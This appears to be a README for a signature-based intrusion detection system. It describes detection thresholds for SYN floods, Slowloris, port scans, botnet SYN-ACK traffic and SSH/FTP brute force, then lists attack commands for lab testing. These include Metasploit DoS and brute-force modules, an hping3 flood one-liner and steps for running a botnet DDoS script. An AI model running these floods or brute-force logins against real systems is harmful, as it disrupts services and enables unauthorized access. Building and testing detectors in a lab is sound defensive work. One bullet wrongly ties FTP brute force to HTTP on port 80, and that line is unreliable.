# Signature Based Intrusion Detection System
## Overview

Your IDS implements several detection features to identify common network attacks. Below is a summary of the main detection logic:

### 1. Botnet/SYN-ACK Anomaly Detection

- **Tracks SYN-ACK packets** from each unique source IP and source port.
- **Counts the number of SYN-ACKs** sent from the same source IP and port within a short time window (default: 3 seconds).
- **Triggers an alert** if the count exceeds a threshold (default: 50 packets in 3 seconds).
- **Resets the counter** if the source port changes or the time window expires.

### 2. SYN Flood Detection

- **Tracks SYN packets** (TCP flag 0x02) from each source IP to each destination IP and port.
- **Counts the number of SYNs** within a short window (default: 5 seconds).
- **Triggers an alert** if the count exceeds a threshold (default: 100 SYNs in 5 seconds).
- **Resets the counter** after alert or when the window expires.

### 3. Slowloris Detection

- **Tracks incomplete HTTP requests** (SYNs) from a single source IP to a destination IP and port.
- **Counts the number of such requests** within a window (default: 30 seconds).
- **Triggers an alert** if the count exceeds a threshold (default: 20 in 30 seconds).

### 4. Port Scan Detection

- **Tracks unique destination ports** contacted by a single source IP within a short window (default: 5 seconds).
- **Triggers an alert** if the number of unique ports exceeds a threshold (default: 50 ports in 5 seconds).

### 5. Brute Force Detection (SSH/FTP)

- **Tracks repeated connection attempts** to SSH (port 22) and FTP (port 21) from the same source IP to the same destination IP.
- **Triggers an alert** if the number of attempts exceeds a threshold (default: 10 attempts).

### 6. Rule-Based Detection

- **Supports Snort-style rules** (see `rules.rules` and `BasicRule.txt`).
- **Matches packets** based on protocol, IP, port, TCP flags, and payload patterns.
- **Alerts** when a rule is matched, with a custom message.

---

**Tuning:**
All detection thresholds and time windows can be adjusted at the top of `IDS.py` to fit your environment and reduce false positives.

**Example Alerts:**
- `[RECORD] SYN Flood detected! Src: <ip>, Dst: <ip>:<port>, Count: <n>`
- `[RECORD] Slowloris attack detected! Src: <ip>, Dst: <ip>:<port>, Count: <n>`
- `[RECORD] PORT SCAN detected! Source: <ip>`
- `[RECORD] TOO MANY SYN-ACK Packets POSSIBLE BOTNET ATTACK from <ip>:<port> in 3s: Count=<n>, Time=...`
- `[RECORD] SSH Brute Force Attempt Detected! 10 attempts from <ip> to <ip>`
- `[ALERT] <Rule message> Source: <ip>, Destination: <ip>, Protocol: <proto>`




## ATTACK SCRIPT FOR TESTING

### DDoS & DoS Attacks and Bot Attacks

### BOTNET ATTACK Type DDoS

**Setup:**
1. Create a file in your VM Kali linux a python file
2. In BotNet.py in this project copy the file values
3. Paste it to the file you created in Kali Linux
4. Run it

**NOTE**
Make Sure that the configurations like IP ADDRESS is changed in the BOTNET Attack file

```shell
cd <PATH-FOLDER>
sudo python3 <FILE-NAME>
```

using Same Machine:

```shell
cd Test
py BotNet.py
```

### 1. Slowloris

Using Metasploit

```shell
msfconsole
msf6 > use auxiliary/dos/http/slowloris
msf6 auxiliary(dos/http/slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

Name             Current Setting  Required  Description
----             ---------------  --------  -----------
delay            15               yes       The delay between sending ke
                                            ep-alive headers
rand_user_agent  true             yes       Randomizes user-agent with e
                                            ach request
rhost                             yes       The target address
rport            80               yes       The target port
sockets          150              yes       The number of sockets to use
                                                in the attack
ssl              false            yes       Negotiate SSL/TLS for outgoi
                                            ng connections


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/http/slowloris) > set rhost <VICTIM IP>
rhost => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > set rport <SERVER RUNNING PORT>
rport => <SERVER RUNNING PORT>
msf6 auxiliary(dos/http/slowloris) > run
```

Using hping ( custom packet/attack gegenrator)

- `hping3 -S -p 80 --flood 192.168.1.2 <TARGET-IP>` 


### 2. Syn Flood
```shell
msfconsole
msf6 auxiliary(dos/http/slowloris) > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > show options

Module options (auxiliary/dos/tcp/synflood):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
INTERFACE                   no        The name of the interface
NUM                         no        Number of SYNs to send (else unlim
                                        ited)
RHOSTS                      yes       The target host(s), see https://do
                                        cs.metasploit.com/docs/using-metas
                                        ploit/basics/using-metasploit.html
RPORT      80               yes       The target port
SHOST                       no        The spoofable source address (else
                                        randomizes)
SNAPLEN    65535            yes       The number of bytes to capture
SPORT                       no        The source port (else randomizes)
TIMEOUT    500              yes       The number of seconds to wait for
                                                new data


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/tcp/synflood) > set RHOSTS <VICTIM IP>
RHOSTS => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > run

```
### 3. SSH Patator

### SSH BRUTE FORCE
### SSH Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS <VICTIM-IP>
run
```

---

### FTP Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ftp/ftp_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS <VICTIM-IP>
run
```

## Port Scanning 

### TCP / SYN Port Scan

    Using Metasploit

```shell
    msfconsole
    msf6> use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <VICTIM-IP>
    msf6 auxiliary(scanner/portscan/tcp) > run
``` 

### Why PORTS are fixed and shouldnt be change if necessary?

### FTP Brute Force
* The FTP protocol, as defined by the IANA (Internet Assigned Numbers Authority), uses port 21 by default for control commands. This is universally accepted and implemented in most systems.
* Attack requires HTTP header parsing, which happens on port 80

### SSH Brute Force
* SSH (Secure Shell) uses port 22 by IANA and is rarely changed.
* Changing SSH port is a rare hardening technique and not common in most systems.

### Syn Flood
* SYN flood are threshold-based per port.
* Port 80 is common for simplified simulation as it allows visible test setups using basic HTTP services.

### Slowloris
* Attack requires HTTP header parsing, which happens on port 80